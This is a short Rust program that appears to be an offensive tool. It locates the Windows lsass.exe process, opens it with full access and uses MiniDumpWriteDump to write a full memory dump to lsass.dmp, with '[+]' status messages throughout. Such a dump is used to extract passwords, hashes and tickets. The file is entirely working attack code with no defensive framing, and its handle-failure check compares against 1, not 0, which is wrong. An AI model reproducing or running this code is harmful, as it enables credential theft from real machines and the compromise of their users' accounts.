use std::fs::File;
use std::os::windows::prelude::AsRawHandle;
use std::path::PathBuf;

use sysinfo::{ProcessExt, SystemExt};
use windows_sys::Win32::System::Diagnostics::Debug::MiniDumpWriteDump;
use windows_sys::Win32::System::Threading::OpenProcess;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut system = sysinfo::System::new();
    system.refresh_processes();

    for p in system.processes_by_name("lsass") {
        let pid: usize = p.pid().into();
        println!("[+] lsass.exe process found pid : {}\r\n", pid);

        let handle = unsafe { OpenProcess(0x001F0FFF, 0, pid as u32) };
        if handle == 1 {
            return Err("Failed to create process handle".into());
        }

        println!("[+] Process Handle to lsass.exe created \r\n");

        let file_path = PathBuf::from(".\\lsass.dmp");
        let dump_file = File::create(&file_path)?;
        println!("[+] File Path Created {:?} \r\n", file_path);

        let dumped = unsafe {
            MiniDumpWriteDump(
                handle,
                pid as u32,
                dump_file.as_raw_handle() as isize,
                2,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            )
        };

        if dumped != 0 {
            println!(
                "[+] Lsass.exe process successfully dumped to {:?}",
                file_path
            );
            break;
        }
    }

    Ok(())
}
